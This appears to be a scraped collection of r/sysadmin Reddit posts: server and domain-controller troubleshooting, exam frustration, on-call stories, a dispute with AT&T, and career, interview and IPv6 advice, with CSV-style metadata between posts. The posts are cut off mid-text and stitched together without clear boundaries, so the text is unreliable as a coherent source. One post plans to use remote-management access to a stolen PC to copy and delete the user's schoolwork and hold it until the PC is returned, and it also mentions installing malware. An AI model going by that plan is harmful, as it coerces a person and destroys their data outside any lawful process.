3. VT and Execute Disable were disabled(!).

4. C-states were disabled.

5. Data reuse and streamer prefetch was disabled.

6. Power management was set to ""Maximum power saving"".


...so, I yank the memory, stick it back in where it's supposed to be, fix all the BIOS settings per the spec I originally gave everyone, re-run the benchmarks...

...and **BAM!** 50% **_faster_** than the hardware it's replacing.

Exactly as planned.

Job saved, and people's scorn has turned to admiration because my original plan was basically perfect.

The guys who claimed to have been supervising and verifying are embarrassed as FUCK.

Ooh-rah!

**Update:** The vendor says their consulting partner was responsible for populating the memory layouts, so there's some shit going down between them, too. 

We already have another $500,000 project planned with them for the end of the year, so we'll probably be able to leverage this into some additional discounts &amp; freebies, not to mention that everyone involved will be extra careful and falling all over themselves to make sure everything goes right with the next batch.

Edit2: OK update.  With the help of some redditors on IRC we have found that the largest issue lies in the fact that none of my domain policies transfered over...basically an empty sysvol folder on all three remaining DC's.  Evidently this is bad from what I am told :) So those policies must have only resided on the old DC.  I will bring that old DC up tomorrow on a small seperate lan, and attempt to recover the now deleted Sysvol off of this.
THANK YOU EVERYONE WHO HELPED!

OK so I finally made an account, as I don't know where else to turn.  There is actually a very long back-story that I will not go into but rest assured it is all bad.  I got hired here to do desktop support three weeks ago.  It was just myself and a Sysadmin who hired me.  Well my second day the Sysadmin turned in his notice, worked out the week and left for greener pastures.

The issue is...he left a mess that has blown up.  So we have two Server 2003 DC's.  And yesterday one crashed.  After hard-booting it, it took two hours to finally come up to a login-screen, so when it did I googled my ass off, and found that a DC just dying is bad, so I went through the steps and decided to take it off the network. I backed up DHCP, brought two new DC's on an older (yet still newer than the current servers).  Bare in mind I have never done any of this, and only have a limited knowledge.  DNS and AD moved to the new DC's without a hitch, at least it looks like it has.

Next I tried to move the FSMO roles (again google helped a lot) that were on the dying server to the new DC (2008R2) and i got error after error....so I seized them.  So far I am feeling a little confident that I am going to get this fixed, but scared none-the-less.  Then I read to DCPROMO the old server out...so I did and everything went to hell.

I still have one old DC up (the one that did not have a million issues), and two ""new"" DC's.  I see all of them in NTDS in AD, and they all show FSMO roles on the correct new DC.  The issue I think is that I dont have a Netlogon folder on any of the three!!!  Therefore I got issues everywhere.  I ran a DCDIAG on the new DC that has the FSMO roled (googled that too, so dont think I know what I am doing) and failed the ""NCDecDesc"", ""Netlogons"", ""Services"", ""Replications"", ""and SystemLog"".  Am I as screwed as I think?  Any advice?  I am trying to find a consultant that can come ASAP in this area, but so far the earliest it is looking is Thursday so far.

1361902420.0,236,self.sysadmin,199rsq,IT veteran failed the 70-642 exam.,289,53,354,http://www.reddit.com/r/sysadmin/comments/199rsq/it_veteran_failed_the_70642_exam/,"I consider myself an IT veteran with about 14 years of experience in Network and Systems Administration in various industries and fields.  Yesterday I wrote my *'second shot'* of the **70-642** exam and failed.  

I'm not feeling terribly happy about it for a few reasons but mainly because I feel these exams don't accurately portray most things a Sysadmin will experience in the real world.  

* A lot of questions asked seemed to arise from the obscure depths of obscure environments that 99% of Sysadmins would never experience. So why this is tested is beyond me.  You can liken this to a high school math teacher telling you you're going to be doing trigonometry every day for the rest of your life.  This just doesn't happen so what does asking these types of questions really prove?
* I studied from two sets of study materials (Microsoft Press and Sybex) and one big thing I noticed was that the exam covered a lot of things that were only ever *'touched on'* in the books.  A lot of side-reading on this indicates that a candidate requires at least a few years of experience managing and supporting Windows 2008 network environments which leads onto my next point...
* I've read about people with zero IT experience writing this exam and passing first try, how on earth does somebody with 14 years experience fail on this yet somebody with no experience pass?  It just doesn't make sense.  Baffles me.

The takeaway from this is that I feel burned, battered and bruised from the experience but I still need to re-write this exam (for the 3rd time) and additionally write the 70-640 and since **I don't want to fail again** what study techniques do you recommend?  

***Things I've tried include:***

* Making detailed notes from course materials
* Doing in-depth labs
* Spider diagrams
* Recording myself talking over the study materials
* Using colors!
* *... oh and drawing on 14 years of experience supporting the real world environments that any decent Sysadmin supports.*

... **any suggestions on study technique improvements would be appreciated.**

^EDIT: Due to NDA, I can't talk about specific examples.  I signed the NDA, I respect it.

^EDIT2: Wow guys, it seems to be unanimous, based on the comments I've read, *that certs are all about memorization and don't reflect anything real world*.  I can only hope that Microsoft takes note and does something about it.

^EDIT3: Brilliant responses all around, it's definitely given me some solid info to go on and make some important decisions moving forward.  You guys bring a tear to my eye.....group hug?

Taking suggestions.,290,63,349,http://www.reddit.com/r/sysadmin/comments/tze15/i_have_administrative_access_to_a_stolen_pc_that/,"This computer was stolen several years back during a hurricane evacuation.  I've given the police their address, IP/time logged in, first and last name, and even what school they attend.  The police have not moved on this case even though there was financial data on it when it was stolen.  I did remove the financial data remotely and overwrote the sectors with random data, but I didn't tell the police that yet.  I sent the thief a few messages already asking them to return the computer, but no reply.  They simply closed the chat dialogs.  Even if they're not the one who stole it directly, they know it's hot.

It's pretty frustrating.  It doesn't look like we'll get the PC back, and the owner has authorized me to do what I want with it.  I have full access to this PC through our remote management software.  It's online for 4-6 hours a day.

There's the obvious choices like installing malware/viruses or deleting their files, but I'm looking for some kind of poetic justice.   I wrote a script to pop up ""Never Gonna Give You Up"" in a minimized IE window every 15 minutes for several days, but decided I'd rather not just frustrate them into reformatting or getting rid of it.

When I snapped a screenshot of the desktop a few days ago they appeared to be working on a school project that looked like they've invested a lot of time on.  I snapped another screenshot today and they're still working on it. So I was thinking I would grab all of their documents, zip them up, and download before deleting them.  Then I can send them an anonymous e-mail requesting that they return the PC (either drop off or mail), and upon receipt I'll return their schoolwork and stop pursuing the police investigation.  Obviously being in /r/sysadmin IANAL, so I'd want to keep myself out of trouble.  

So /r/sysadmin.  Any other suggestions?

I'm fairly certain I'm going to get counter offers and phone calls from people/owners around the country begging me to stay.  Don't worry though, it won't work.  


Update:  I called the boss at home and gave him my notice. It went better than expected.  I kept it positive and when he pressed for a reason I told him that my position isn't a one man job.  He agreed.  He didn't try to keep me around, and thanked me for my service.  He also wants me for the two weeks and said he may end up contracting with me down the road.

I've recently started to receive spam on 3 unique email addresses that I used on another service. The other service has a privacy policy saying they don't share your email address, so either they were hacked or they don't honor their policy. These spams were not caught by my scanner nor any blocklists. After getting hit multiple times per day with 3 emails I quickly found their whole netrange and created a shitlist for my exim. Hosts on the shitlist are first delayed by 2 minutes and after that they get a random error or warning with a temporary rejection code so that they retry later. The goal is to basically tarpit them. They are currently trying with all their ips (sequential, as you can see in the logs) to get a spam in. I wonder how long it is gonna take for someone to notice :) Here are some logs for your entertainment:

No worries...but then the guy gets canned.  I'm back!  ""Woot!"", I think

So begins the oncall from hell.  I work a weird graveyard shift...10-6.  So often times I'm not really clear on what day things happen because my shift starts on one day, ends on another.  As such, I headed into work armed with the possibility that this was my ""holiday"", and I'd have the place to myself.  Sho' nuff...sweet peace and quiet.

I'm ready to kick back and enjoy some quality alone time down in the NOC, listening to the servers hum, and hopefully nothing blows up.  The folks over in support are pinging me occasionally for help, but nothing major is going down.  Did get to solve a couple cool problems where I learned something new...So far, so good.

Boss-man signs on, hits me up, and I ask him what the hours for my oncall shift are.  He tells me 10-10.  12 hours...piece of cake.  I got this.  So I power through the night with minimal drama, and I look back at my chat logs and realize I misread that fucker.  It's 10p-10p.  24 solid hours of babysitting Nagios.  Oh well...it's ok.  I'll catch a few winks between Netsaint emails, and I'll get through this mess.  I get a support lead to cover for me so I can drive home and work remotely.

I snuggle into bed w/ my laptop right as the holiday TS crew starts gathering steam.  And all of the sudden, servers blowing up EVERYWHERE.  The support leads are asking me for help, and netsaint is screaming at me with services down all over.

I'm handling it like a boss, but this is putting a serious cramp in my advanced napping style.  I'm really starting to drag at this point, and somehow manage to catch 20min of shuteye somewhere mid-afternoon.  A bit later, my wife makes dinner, and I eat, checking email and monitoring our chat room between bites.  The worst appears to be over.

It's 8:00pm, things are kinda quiet, and the end is in sight...A vserver starts reporting.  No problem, I powercycle it and carry on.  Next email...still reporting. WTF?  I console in....nothing.  I powerc again...nothing on console.  I call up our datacenter provider and ask if they can poke the machine.  They go, still nothing.  I ask them to make sure the power lights are on and drives are spun up, thinking perhaps the BIOS wasn't set up to last state after power-on.  

My remote hands take the initiative to crash-cart the machine.  He calls me back.  No VGA.  Fuck.

I now need to drive all the way back to the DC, which is an hour away, and I will be crossing paths with the guy would be relieving me on my way out.  SO. DAMN. CLOSE.  I head out there, failover the machine to new hardware, with no shortage of technical (spare machine in wrong vlan) and physical (narrow row, 80lb, 2u machine in bottom slot, mangled rails, sliced fingers) hurdles along the way, and end up clocking a total of 25 straight hours of work.  Between OT, Double Time, and Holiday pay, I expect this check to cover my new gaming rig and then some.

AT&amp;T failed to disconnect it when they vacated, and so their nearby communications infrastructure depends on it running.  So, for the first time since I've started working here (1.5 years), AT&amp;T decides to send out a rep to check on the equipment (which up until this time we had no idea what it was).  I inform them that the room is slated for demolition in 4 days.  After much bickering, here is where we've ended up.  This just confirms my hatred for AT&amp;T:

-Despite the fact that we've informed them of our demolition schedule, they refuse to find reasonable hours to remove the equipment.

-The rep has threatened multiple times that if we unplug the equipment, I could be charged with an act of terrorism.

-They insist that WE must pay for an after-hours security guard to escort them through the building while they unplug everything of theirs.

-Apparently we are CONTRACTUALLY bound to keep the equipment running, despite the fact that we merely moved into a previously vacant space, without having signed any paperwork with AT&amp;T.


...I'm tempted to cycle the power on this rack several times today...

UPDATE 8/15:
Well, sadly, not too much new news.

After an argument that escalated into a yelling match, I gave him the finger and told him to talk to legal. He insisted that I better not unplug it (after he couldn't trace the MPOE for the fiber), and promptly left. The landlord of the building confirmed that they had no agreement with AT&amp;T to provide space or power to the device, and I managed to trace the fiber to an abandoned server room in our building. Essentially, it's not plugged into anything, despite his insistence.

So, In summary:

* He made false claims about the landlord and my company entering into an agreement with AT&amp;T.
* He lied about the DS3 device being connected to anything.
* He threatened to have me arrested for something that both a lawyer and police officer confirmed would not get me into trouble.
* I avoided any further confrontation with AT&amp;T because they could settle out of court with us, regardless of whether or not their claims were valid or not. They would definitely put us out of business.
* I asked him for his manager's contact information, he ignored my email, I contacted his coworkers, and they convinced him to play fair.
* Fuck AT&amp;T. If this guy was a baby, I'd put him in a blender. Or peel him, and then salt and lime him.

I have compiled my top tips and I wanted to compare notes with other Professionals in the field...

**1-Have a written Agenda** 

for your IT meetings, keep track of: New Business, Unfinished Business, Finished Business, Incident Reports, Current status of ongoing projects and future projects (planning)

**2-Incident Reports**  

(Use them and recap every week at your IT meeting)

**3-Keep a running list of any upcoming projects** 

We plan in Seasons at my college, so we have Spring/Summer/Winter/Spring projects all outlined way in Advance

**4-Keep your 5yr plan updated** 

At all times. Be prepared to have an in depth discussion about what your plans are at any moment. This keeps you thinking about the future and shows your ready for it when the time comes.

**5-Even the simplest project needs a plan** 

Even something as simple/obvious as a new printer needs a plan. Research and look at other options even if you're already steering towards a certain product. Be prepared to defend your decision and explain why it is the superior choice.

**6-IT Surveys (Anonymous)**  

These have a lot of value in my organization. We send them out before Faculty leave at the end of the year and we get feedback from them about everything from Smartboards to wifi. It has helped us address issues that aren't brought up in a support email since they are in the frame of mind to think about the issues they experienced during the year. We do this for Staff/Faculty/Students (believe it or not) - People are more willing to speak their mind if its anonymous and you will get real feedback that is very useful for future planning.

**7- Quarterly Reports**  

We are still working on this one. It is time consuming to put in the data and analyze it for such a small timeframe but scale it to your needs. Looking back every quarter to assess and plan as a team is a very useful tool especially when things can change so quickly.

**8-Maintenance Checklists**   

Have a Weekly, Monthly and Yearly Checklist. They are a godsend and will also be a great support document come raise-time.

I look around quickly and notice that the smell was getting stronger as I got closer to the server room (the door was open). I made a cursory glance at the racks and seeing nothing obvious head out to get help. I grab our technicians and head back to the server room. As soon as I enter I just happened to look at an empty electrical outlet on the back wall....and saw a red glow coming from inside the socket. Upon closer inspection I noticed that the grey plastic was starting to turn black. One of the techs ran to the electrical closet and shut off the power to the server room while the other tech and I shut down the servers. Within about five minutes and a single phone call later, we had about five maintenance/facilities guys on site along with three or four upper management people. Funny thing is, it was so late in the day that we didn't even get a single helpdesk call about ""no Internet"" or ""my computer isn't working"".

Apparently the empty socket was on the same circuit as the server racks and the draw was too much for it to handle. I keep this on my desk just to remind myself how lucky we were that day: http://i.imgur.com/udXLP.jpg

1361185361.0,213,self.sysadmin,18qukw,So your interview went craptacular? Heres why. [Rant from the other side of the table],294,81,228,http://www.reddit.com/r/sysadmin/comments/18qukw/so_your_interview_went_craptacular_heres_why_rant/,"I interviewed someone for my position a couple of days ago. I finally got manglement beaten mushy over the fact that I'm utterly flooded with work and need a second guy. So they started the recruitment process which is a joke in itself, but one to be told another time.

However, the first interview went absolutely tits up. Most of the other interviewees’ errors were completely avoidable. Some of the following points are borrowed from other interviews I did but fit in here.


* If you put in your application and CV, make sure it looks decent.
Pretty much any layout does it, as long as there is one. Even MLP styling is an improvement to no layout at all. 
Even more important: **get your spelling right.** If I see two spelling errors in the first phrase already I’m going to check the rest pretty thoroughly for more. And if I find more, I can’t imagine how you will ever get any scripting or even easiest shell usage right. 
Use the effin spellcheck. MS Office has one, Libre Office has one, there are around 5 million for any Tex environment there is and there even are spell checks for vim, emacs, nano and joe.
Show that you take the company you're applying at seriously, you want the same thing in return.

* Show up at interview day in decent clothes. I'm not the shirt and tie guy myself so I don’t expect both from others. But your appearance is basically promoting yourself without a word spoken, so make sure you get the most out of that.
If you look like some college kid run out of fresh clothes and taking the last sweater and jeans from the drawer, you know those you don’t like to wear, it will look pretty much the same to the guys you want to talk business with.
It’s better to be overdressed than underdressed. Do not look like going to your own wedding however.

* Proper language skills. The place to talk in slang and slurs is at the coffee maker not the interview. The company will pay you for professional behavior and not for wannabe ghetto street cred. Most likely you will have to talk to people likely business partners and clients on the phone. 
And while were at it, foreign language skills dont really matter unless you're afluent enough in a language to talk other people in it. 


Now for less superficial things:

* If i ask questions about what you did so far and what you do at your current/last gig, tell in detail.
I don't care for some rattled down list of abbreviations and product names but i want to know in what depth you used that stuff.
See there are e.g. Exchange servers and Exchange servers. The first variety receives and sends mail and that’s about it. My boss could install one if he had a user with the privileges to do so. The other variety is the one that’s integrated. Including fancy things like external spam and virus checks, a mail gateway in front of it, integrated with half a dozen other services that run around.
What I do not care about is details about the business you do with your servers in your former/current company. I am pretty sure you have an NDA on those and it doesn’t shine the best of lights on you if you can’t fathom the difference between a schematic description of what you have set up/worked with so far and internal business details.

* There is academic knowledge and practical knowledge.
Both are important but do not lie about which is which. Nobody can know everything and you can’t possibly have had hands on at everything that will get thrown at you.
E.g. I have some academic knowledge about what tier-1 carriers put up with and what stuff they run. I never had hands on that kind of work nor on that kind of networking hardware. I wouldn’t tell that I did if I got asked. But I sure would tell that I would really love to play learn the ropes on that stuff.
So if a field shows up in the interview that you never worked with tell that.
Even if you get through that interview with that little lie, it will come up later. And most likely it will do so at the most embarrassing moment imaginable.
If you do not have a clue at all about something, say so. Everything above applies here too.
Same is for having dabbled around in something for years but not knowing how it really works because that wasn’t really necessary.

* No mouthing of about former employers. Mainly it is just bad manners. Another reason is that I don’t care if your former boss sucked, if your co-workers had the brains of a half dead fly or you had to network with tin cans and a string. 
Your general motivation to switch jobs however naturally is of interest. Pretty much every reason besides really brain dead stuff is ok there. The color on of the floor tiles in the server room doesn’t count unless it was pink and brown checkerboard pattern.
Pay, family reasons, work atmosphere, commute, etc. are all valid reasons and since my company wants to keep you if we decide to employ you it is important for us to know.

* Have an idea about the appropriate of your paycheck. There are multiple ways to check what is usually paid in the area. If you show up with a very low number, I won’t change that to a higher number by myself. If you show up with a way too high number, prepare for some haggling. That’s nothing unusual, that is just business.

* Ask questions if something is unclear. That is your damn right after all the grilling I did and misunderstandings are usually easily preventable. You want to know how we deal with sick days? Ask. You want to know what management tools we use for Hardware? Ask.
Generally an interview has some small talk part. That is pretty important to get a first idea of whether you fit to your work mates or not.
Unless in the technical parts of the interview there is no right or wrong I those parts. Do not try to guess what the interviewer wants to hear because that will show. And probably I only try to find out whether you are a douchenozzle or not.



That concludes my rant. 
Even with the danger of looking like the last asshole I hope that will help somebody preventing from making the same errors like that guy last week and some of the other people I interviewed so far.
None of the mentioned problems alone are a real obstacle to employ someone, if they mass up however it doesn’t look too good.

The interviewee didn’t get the job mainly because the lack of knowledge in a very important field to us. That happens and doesn’t depreciate the fields he is good in, it just didn’t fit.

I needed a linux box and you made it with the distro I wanted, the version I wanted, and had it on my desk within two hours.

I found out that one of the lab computers that was running really slowly could support more ram. I asked you for it and the only question you asked me was when you could install it. This morning it was there installed and working. 

I asked you for a Quarites 2 license as well as a Matlab one and you did it perfectly overnight.

I went to thank you and asked for a mouse pad. You handed it to me, i then asked if I could get the corporate email signature you said I would have it before I even got back to my cube. It was there.

You make my job easier. Time I am spending running defrag, virus sweeps, messing with email clients, etc. is time I am not spending in the lab. I have consulted at multiple companies for years and never worked with a Sysadmin who was as nice and professional as you. without that ram upgrade the one computer we can use for this test fixture would still be crashing.

The macro in question removes duplicate entries from a single table. It appeared to not be working correctly. I found that the macro that does this calls **11 queries**, two other macros, and uses 4 temporary tables. The naming convention for all of these was..

No question is too big, too small, or complex. I'd also like to invite any other licensing peeps to come out for the discussion and help people out!

It can be product, opinion, contractual (Open Business - Open Value - Select - Select Plus - Enterprise Agreements... ), anything!

When the domain controller realizes that a computer with that name is already on the network it will revert to the name previously assigned to the computer, the domain controller's name, and then add the computer to the domain.

It was about $9000 worth of 4TB drives, destined for a file server in our data center.

When they arrived, we saw that they had been packed and shipped thusly: [FAILBOX](http://turdb.in/dump/hdds.jpg)

Anyway, reading the original thread you can see that we at least tried to put the drives in to see if they survived shipping or not. 

Spoiler Alert: They did not.

Final count: We had three that were DOA straight out of the box, the RAID controller wouldn't even recognize them. We did end up with 16 of them that the controller would see, and out of those, another 3 failed within two days. 

All the rest of the drives were promptly removed from the file server, boxed up PROPERLY by me, and sent back to the vendor for a refund. We then re-ordered from Newegg.

Here's how they sent the drives: [Much Better](http://turdb.in/dump/correctpackaging.jpg)

Outlook pops up its disconnected-reconnected message, Exchange has failed over to our Disaster Recovery site. The phone rings and before I can pick it up I see a panicked looking face outside my office. My second line starts ringing too.

Glancing up at my system health light board (FrameFlow/Tembria) I see red dots for more than half my servers. Offline. 14 Servers. Its much bigger than just Exchange.

I answer the phone with ""There is a system problem that I am currently working to resolve, please try again in a few minutes"" again and again while my attention is focused on doing just that.

I'm telling myself, ""I've been here before, I'm prepared for this"" but panic gradually sets in as I check my Netapp SANs and VMware Hosts and find they are up, with no problems reported.

I can't log into any of the servers that aren't reporting. They have been down for almost 2 minutes now.

Switches! I run through the office (ignoring any inquiries) and swipe into our server room. All the UPSs and switches are green. The 2 SANs and 3 VMware Hosts are also not showing any indication of the horrors they are inflicting on my morning.

Running back to my desk I think through what else could be causing this. The only thing I was doing that morning was a resize command on our of our LUNs in Netapp. I look again at Netapp, all volumes are up. Looking at the error logs i see some iSCSI reconnects, was this a symptom or the cause of the problem?

Its been 7 minutes since the systems went down.

With one hand I call Netapp, with the other I call my IT Director (we are a 3 person team, Director was out sick and our Desktop Support tech doesn't come in for another 20 minutes).

In that moment, with 2 phones on either side of my head and 3 screens worth of errors and black disconnected remote desktop sessions and ping -t results in front of me, a ray of sunlight: Outlook reports that it is connected. A quick look shows that we have failed back. Suddenly some of the server remote desktops come up. Within seconds my light board shifts to green for most of the servers as they begin to report. Many had rebooted.

I tell my IT Director we had a major system outage that is resolved now and i would call him back with more info as soon as i had it.

An hour with Netapp Support shows that the resize command, when used to shrink a LUN, can cause performance issues, even though the SAN did not fail over to its partner or report any downtime. This could have resulted in the problems we saw.

I survived my 8 minutes of hell, it certainly wasn't the worst, and wont be the last. My system was stable enough for it to recover without any interaction on my part, which I take as a good sign.

**Cobol:** Allocate $500,000 for the project. Define foot, bullet, gun. Run press_trigger. Go for coffee break. Return in time to put foot under bullet. 

**Mac OS X:** You try to shoot yourself in the foot from the GUI but the gun has inexplicably turned into a bag of Skittles.

**iPod:** You shoot yourself in the foot, but you miss, and when you try to reload the gun, you find out that it only had one bullet and you can't change it out, you have to buy a new gun instead.

**IOS:** You go to shoot yourself in the foot, but you realize that you forgot/confused ""wri mem"" or ""copy run start"" and now your gun won't chamber a bullet.

**iOS:** You go to shoot yourself in the foot, but Gun.app was pulled from the Apple App Store.

**Checkpoint:** You go to shoot yourself in the foot, but you can't figure out the licensing you need to buy to activate the ""trigger blade"" and ""bullet blade"" so you end up spending $100,000 on something that gives you ""slingshot blade"" and ""marble blade""---You call to ask about activating the ""gun blade"" and it's conveniently $5000 more.

**Dan Kaminsky:** We really need to do something about the bullet-in-foot action that's been going on! I propose Gun-SEC: each bullet is encrypted with a...ZZZZZZZZZZZZZ.....

While you futilely attempt to impose trigger discipline and range rules, a hail of bullets comes through the holes from the outside from 10,000 other guns, killing you and everyone else in the room.  It's still your fault.

**Sysadmin:** You have a meeting telling everyone how this gun can blow your foot off if you're not careful with it. You tell everyone not to point gun at foot and pull trigger. You build documents explaining never to point the gun at the foot for any reason. You even install foot recognition modules on the gun to disable the firing mechanism in the presence of a foot.

1341059025.0,204,self.sysadmin,vu7s6,Vocatus' Tips for an IT Career,245,41,80,http://www.reddit.com/r/sysadmin/comments/vu7s6/vocatus_tips_for_an_it_career/,"I got a PM asking for sysadmin career advice, and started typing out what I figured would be a 5 minute paragraph, but stopped after writing and revising for about an hour. So I thought I'd share some things I've learned so far as a Network Systems Administrator, both from my direct experience and what older, smarter people have told me. I've broken a lot of these things and paid for it, but that's how I learned to regard them as rules. But here goes. Please add advice or pointers you've picked up over the years on how to have a successful IT career.

My credentials: Worked in the USDA KC data center, done quite a few helpdesk/callcenter gigs, currently in a dream job as a Network Systems Administrator. Hold CCNA, CISSP, A+, N+, Security+ certifications, and a Bachelors in ""Cyber Security."" Finally, 9 years in the Army Reserve as a Warrant Officer, MOS 255A ""Signal Systems Operator"" (LAN/Systems administrator essentially).

Without any further ado:

**Vocatus' Pointers on IT Careers** *(warning: wall of text)*

**1.** If you can get into a niche you really enjoy (firewalls, routers, Linux, SANs, etc), you'll enjoy the job 100% more than a job you don't like but stay in for the money.

**2.** If you are a **good employee** (be on time, take responsibility for your mistakes, do your job well) you will go far. Hard working, honest people are hard to find. This is more of a character thing than strictly IT, but it carries over into career advancement.

**3.** You exist to support the company, or if it's a smaller company where one man has say, your boss. One day in the Army I was mad about some changes we were required to make to the network, a fellow Warrant Officer told me ""Yeah, they're bad ideas, and we told him [the Commander]. But he acknowledged the risk and said go ahead anyway, so that's what we'll do. We're here to support the boss and the mission."" This had a big impact on me and changed how I view my role in the workplace. As an IT professional, it is my job to support the company's mission by tailoring the network the way *they* want. I might disagree and should voice my opinion as an expert in the field, but ultimately, when it comes down to it, it's their network. This is hard to swallow for a lot of people, but embodying this concept ultimately makes you a more valuable asset in the long term.

**4.** Get at least a few certifications towards your focus, and a college degree. N+/CCNA/CCNP for networking, A+/MCSE for systems admin, Security+/CISSP for security-oriented, etc. A degree shows long-term work ethic, and certifications show that you are staying current. Both are good. If I had to loosely summarize, I'd say certifications can help you get hired *right now*, and a degree can help you get promoted in *long-term*.

**5.** Learn at least some basic scripting. If you're a Linux admin, learn bash or Perl. If you're a Windows admin, learn batch or PowerShell. I hate coding, but I love being lazy more than I hate coding, so I've hacked together some huge scripts to automate things that are tedious or annoying. It takes time initially to write them, but they save HUGE amounts of time down the road.

**6.** An older Warrant Officer that taught a class I was in told me that one of the most important things he's learned is to take responsibility for his mistakes. Someone who is honest and has integrity is far more valuable than someone who blame-shifts. Everyone screws up, just admit it and fix it. This had a big impact on me.

**7.** Have backups!!! I can't stress this enough. If you're in charge of the Domain Controllers, back up *everything,* off-site if possible. Active Directory, DNS, etc. If it's routers, back those configs up like your life depended on it. The day something blows up (it will, eventually) you'll be crying tears of joy you have those backups.

**8.** Document your network. I can't tell you how many times I've fallen in on a position (both in the Army and civilian world) where my predecessor didn't have any current documentation. Get in the habit of regularly documenting all changes you make to systems, scripts, configs, etc. Anything is better than nothing.

**9.** Change things (for the better). *But*, in your zeal to perfect the system, don't start immediately changing things when you first get into a position. Take time to learn *how* everything is working, and then, most importantly, *why* everything is working. Some things that seem stupid and random turn out to be in place for a good reason. I made a mistake in this area when I first took my current position. I wanted to fix some big problems really fast, but I stepped on a lot of toes in the process. I violated Dale Carnegie's #1 point in Dealing With People, which is ""don't criticize."" The guy who set this up in our shop is a #10 (see below) sort of person. My life has been a lot easier once I learned not to stomp on his toes when changing things he set up, just lightly step on them.

**10.** **Learn to recognize people that have ""unofficial"" power.** What I mean is people like the secretary/admin assistant who talks directly to the boss, the HR lady who knows everything about everyone, or the old guy who's been there forever and knows how the crazy 1970's alarm system works. Make friends with those people, if for no other reason than to learn from them. Never make the admin assistant angry.

**10+1.** Finally, something that is often overlooked and that geeks in particular seem to struggle with: **be aware of workplace politics**, they're a fact of life. I've never worked anywhere that didn't have at least SOME kind of drama. As tempting as it may be, don't trash people behind their backs. It will always come back and bite you at some point. If you spend 90% of your time listening and 10% talking, people will love you (more Dale Carnegie influence here). Don't think you're too good for workplace politics, just navigate them with care.

**11.** Just a thought on career advancement, **my personal rule of thumb for staying in a position** is either a) three years, or b) when I feel I'm not learning any more (stagnating), whichever comes first. If I'm still in a position after three years then it's time to evaluate if it's a good place to stay.


**How I spend my time** *(revised)*

* About 65% routine stuff. Scripting backup jobs, managing workstations, servers and patches, user problems, etc
* About 20% cool projects that really make me think, and are an opportunity to come up with a creative solution. 
* About 10% stopping work and being social with fellow employees, classically known as ""water cooler talk."" For a lot of people this comes easily, but for me it's something I'm having to learn, that people like you a lot more when they feel they know you a little bit outside of a strictly work relationship.
* About 5% big emergencies or critical problems. Although these are extremely stressful, I feel they're the biggest learning opportunity, because you have to act quickly and often come up with crazy solutions that work.


**Daily routine**

Usually I come in in the morning, check email to make sure there are no emergencies, then browse the web or catch up on emails for about 30 minutes to an hour, before everyone gets in. The rest of the day is spent working on improving the network, and side projects (if there's nothing from The Boss going on), or working on stuff The Boss gave me. Or taking care of emergencies if they happen (router dies, firewall crashes, domain controller dumps, etc).

Previously backups were done locally there. This site is technically a seperate institution that operates under my institutions umbrella.  Theyre notorious (in our IT dept) for resisting attempts to be managed by us and coming under the same guidelines as the rest of the Company. Its the ""I make X number of dollars for the company. "", and "" Every minute Im down is costing the company millions of dollars."" BS that we all roll our eyes at.
So low and behold I find several users have stashed not only their vacation pics from 2008, The family reunion, and 1000 shots of little Jimmy's soccer game, totalling about about 10GB in their user folder(s). But these same users have about 30GB of music.  One guy had his tax returns for the past five years and his divorce affidavits and settlement.
Its not a space issue (despite what I told the users).  Its a new server, theres half a TB in freespace.  The issue is this totally bloats our backup and backup window. Im not wasting time backingup your music!  Damn this isnt Dropbox, this is a financial institution.  That server is there for your work files, not to operate as your offsite backup from home.
So I email these users asking them to remove their non-work-related files.  One was their IT liason, a member of the domain admins group for heavens sake, I had to send that brilliant bulb a link so she could find what I was talking about in the tangled subfolder-subfolder-subfolder structure of her user folder.

1352999916.0,187,self.sysadmin,138xo2,"Friendly reminder. DO NOT un-check IPv6 on your Windows adapters. Instead, do it the right way.",262,75,170,http://www.reddit.com/r/sysadmin/comments/138xo2/friendly_reminder_do_not_uncheck_ipv6_on_your/,"I work in a services support &amp; consulting role for a large IT company and deal with many different customers. So because of this wide user base exposure I can confidently say I've seen this happen literally hundreds of times. Please DO NOT uncheck IPv6 on your windows network adapters. 

I've preached this many times; sometimes on this subreddit and it seems to be a point of confrontation for some. However, today I saw a post I had been commenting on updated detailing that this was likely the root cause. So allow me to explain why.

First off here's the [post] (http://www.reddit.com/r/sysadmin/comments/136kds/cant_start_exchange_information_store_service_for/) and the relevant [comment] (http://www.reddit.com/r/sysadmin/comments/136kds/cant_start_exchange_information_store_service_for/c719ge4).

Now here's several articles explaining why it is a bad idea to uncheck IPv6 on a Windows Adapter:
[1](http://tweaks.com/windows/40099/how-to-properly-disable-ipv6/)
[2](http://support.microsoft.com/kb/929852)
[3](http://www.windowsnetworking.com/kbase/WindowsTips/WindowsServer2008/AdminTips/Network/DisablingIPv6theRightWay.html)
[4](http://www.sbsfaq.com/?p=2548)

So let's talk about why. In basic terms, your operating system is still utilizing IPv6 and so are the applications running on it. If the protocol is unchecked on the adapter then the application is made largely unaware of this and can cause communications problems. If you wish to disable IPv6 for whatever reason then simply follow the above articles and disable it via the registry (then reboot). 

Now to follow up to that, I know there may be certain scenarios where IPv6 might need to be disabled but as for the official stance from Microsoft, here it goes. I've spoken with several people at Microsoft (Program Group, Premier Field Engineers, &amp; Support Personnel) &amp; their stance is the same. Microsoft states that they have no reason why IPv6 should ever be disabled and recommend it not be. 

Now there may be environmental reasons why; incompatible application, etc. However, here's what I ask of you; HAVE a reason to disable it. Too many people when asked why they choose to disable it respond with silence. They disable it out of fear or because it's what someone else told them. Simply put, if you can't provide a good reason to disable it then DON'T (and ignorance is not a good reason). And please if you do choose to disable it then do it the correct way I have listed above from Microsoft. 

A common excuse I hear from people is that ""well I've always done it this way and never experienced issues so you are full of it"". In most cases these are localized admins who really only work in one environment. I've worked with many many different customers over the past 6-7 years since this issues has become prevalent and trust me; it's a bad idea. Just because you're not feeling the pain does not mean something isn't mis-configured. Exchange, TMG, &amp; SBS seems to be much more sensitive to this but just about any application can fall victim. I've even seen Anti-V cause issues on servers after IPv6 has been un-chcked in the adapter.

Anyways, I'll get off my soapbox now. :D

1363810158.0,185,self.sysadmin,1aonei,Going into an interview? I gathered tons of advice from /r/sysadmin and here it is,222,37,64,http://www.reddit.com/r/sysadmin/comments/1aonei/going_into_an_interview_i_gathered_tons_of_advice/,"Had an interview yesterday and I think it went well. Before my interview I searched ""interview"" in sysadmin and read a lot of posts and a lot of comments. I collected the advice I thought was good, so here it is! (everything below was posted by users in /r/sysadmin, none of this is my advice. Also I'm a college graduate looking for more ""entry level"" positions, just so no one thinks this is for 15 year sysadmin interviews)

